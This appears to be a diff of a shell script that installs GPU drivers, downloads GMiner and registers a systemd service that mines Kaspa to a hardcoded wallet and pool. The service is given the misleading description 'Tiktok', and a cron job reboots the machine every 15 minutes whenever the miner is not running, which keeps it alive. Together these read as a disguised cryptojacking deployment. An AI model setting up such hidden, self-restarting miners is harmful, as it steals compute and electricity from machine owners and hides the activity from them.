@@ -1,7 +1,3 @@
-sudo systemctl enable cron
-sudo bash -c 'echo -e "pgrep -f miner >/dev/null && r=1 || r=0\nif [ \$r = 0 ];\nthen\nsudo reboot\nfi" > /home/cron.sh'
-sudo chmod +x /home/cron.sh
-sudo echo  '*/15 * * * * /home/cron.sh' | crontab -
 sudo sed -i '/RANDFILE/c\#RANDFILE' /etc/ssl/openssl.cnf
 cd /home
 sudo apt-get install linux-headers-$(uname -r) -y
@@ -15,6 +11,10 @@ sudo apt-get update
 sudo add-apt-repository --yes ppa:graphics-drivers/ppa
 sudo apt-get -y install cuda-drivers-510
 sudo apt-get install libcurl3 -y
+sudo systemctl enable cron
+sudo bash -c 'echo -e "pgrep -f miner >/dev/null && r=1 || r=0\nif [ \$r = 0 ];\nthen\nsudo reboot\nfi" > /home/cron.sh'
+sudo chmod +x /home/cron.sh
+sudo echo  '*/15 * * * * /home/cron.sh' | crontab -
 sudo wget https://github.com/develsoftware/GMinerRelease/releases/download/3.15/gminer_3_15_linux64.tar.xz
 sudo tar -xf gminer_3_15_linux64.tar.xz
 sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/miner --algo kheavyhash --server pool.us.woolypooly.com:3113 --user kaspa:qzpzjtxw89lft8ju2cf5y3qd4gaa453uzcmsdfmj9m8ktltmhvrpxmvlgaw3e.kotex\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
